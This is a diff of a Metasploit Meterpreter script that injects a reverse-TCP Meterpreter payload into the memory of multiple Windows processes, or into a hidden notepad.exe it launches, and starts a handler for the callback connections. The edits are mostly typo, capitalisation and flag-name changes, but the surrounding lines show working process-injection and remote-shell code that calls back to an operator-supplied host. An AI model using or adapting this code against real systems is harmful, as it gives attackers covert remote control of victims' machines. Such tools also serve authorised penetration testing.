@@ -1,6 +1,6 @@
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
-# If you'd like to imporve this script, please try to port it as a post
+# If you'd like to improve this script, please try to port it as a post
 # module instead. Thank you.
 ##
 
@@ -20,11 +20,11 @@ payload_type = "windows/meterpreter/reverse_tcp"
 start_handler = nil
 @exec_opts = Rex::Parser::Arguments.new(
   "-h"  => [ false,  "Help menu." ],
-  "-p"  => [ true,   "The port on the remote host where Metasploit is listening (default: 4444)"],
-  "-m"  => [ false,  "Start Exploit multi/handler for return connection"],
-  "-pt" => [ true,   "Specify Reverse Connection Meterpreter Payload. Default windows/meterpreter/reverse_tcp"],
-  "-mr" => [ true,   "Provide Multiple IP Addresses for Connections separated by comma."],
-  "-mp" => [ true,   "Provide Multiple PID for connections separated by comma one per IP."]
+  "-p"  => [ true,   "The port on the remote host where Metasploit is listening (default: 4444)."],
+  "-m"  => [ false,  "Start exploit/multi/handler for return connection."],
+  "-P" => [ true,   "Specify reverse connection Meterpreter payload. Default: windows/meterpreter/reverse_tcp"],
+  "-I" => [ true,   "Provide multiple IP addresses for connections separated by comma."],
+  "-d" => [ true,   "Provide multiple PID for connections separated by comma one per IP."]
 )
 meter_type = client.platform
 
@@ -33,9 +33,9 @@ meter_type = client.platform
 # Usage Message Function
 #-------------------------------------------------------------------------------
 def usage
-  print_line "Meterpreter Script for injecting a reverce tcp Meterpreter Payload"
-  print_line "in to memory of multiple PIDs, if none is provided a notepad process."
-  print_line "will be created and a Meterpreter Payload will be injected in to each."
+  print_line "Meterpreter script for injecting a reverce tcp Meterpreter payload"
+  print_line "in to memory of multiple PIDs. If none is provided, a notepad process"
+  print_line "will be created and a Meterpreter payload will be injected in to each."
   print_line(@exec_opts.usage)
   raise Rex::Script::Completed
 end
@@ -43,7 +43,7 @@ end
 # Wrong Meterpreter Version Message Function
 #-------------------------------------------------------------------------------
 def wrong_meter_version(meter = meter_type)
-  print_error("#{meter} version of Meterpreter is not supported with this Script!")
+  print_error("#{meter} version of Meterpreter is not supported with this script!")
   raise Rex::Script::Completed
 end
 
@@ -62,12 +62,12 @@ def inject(target_pid, payload_to_inject)
     host_process.thread.create(mem, 0)
     print_good("Successfully injected Meterpreter in to process: #{target_pid}")
   rescue::Exception => e
-    print_error("Failed to Inject Payload to #{target_pid}!")
+    print_error("Failed to Inject payload to #{target_pid}!")
     print_error(e)
   end
 end
 
-# Function for Creation of Connection Handler
+# Function for creation of connection handler
 #-------------------------------------------------------------------------------
 def create_multi_handler(payload_to_inject)
   mul = @client.framework.exploits.create("multi/handler")
@@ -84,7 +84,7 @@ def create_multi_handler(payload_to_inject)
 
 end
 
-# Function for Creating the Payload
+# Function for creating the payload
 #-------------------------------------------------------------------------------
 def create_payload(payload_type,lhost,lport)
   print_status("Creating a reverse meterpreter stager: LHOST=#{lhost} LPORT=#{lport}")
@@ -98,7 +98,7 @@ end
 # Function starting notepad.exe process
 #-------------------------------------------------------------------------------
 def start_proc()
-  print_good("Starting Notepad.exe to house Meterpreter Session.")
+  print_good("Starting Notepad.exe to house Meterpreter session.")
   proc = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true })
   print_good("Process created with pid #{proc.pid}")
   return proc.pid
@@ -112,21 +112,21 @@ end
     lport = val.to_i
   when "-m"
     start_handler = true
-  when "-pt"
+  when "-P"
     payload_type = val
-  when "-mr"
+  when "-I"
     multi_ip = val.split(",")
-  when "-mp"
+  when "-d"
     multi_pid = val.split(",")
   end
 }
 
-# Check for Version of Meterpreter
-wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i
-# Create a Multi Handler is Desired
+# Check for version of Meterpreter
+wrong_meter_version(meter_type) if meter_type != 'windows'
+# Create a exploit/multi/handler if desired
 create_multi_handler(payload_type) if start_handler
 
-# Check to make sure a PID or Program name where provided
+# Check to make sure a PID or program name where provided
 
 if multi_ip
   if multi_pid
@@ -149,4 +149,3 @@ if multi_ip
 else
   print_error("You must provide at least one IP!")
 end
-
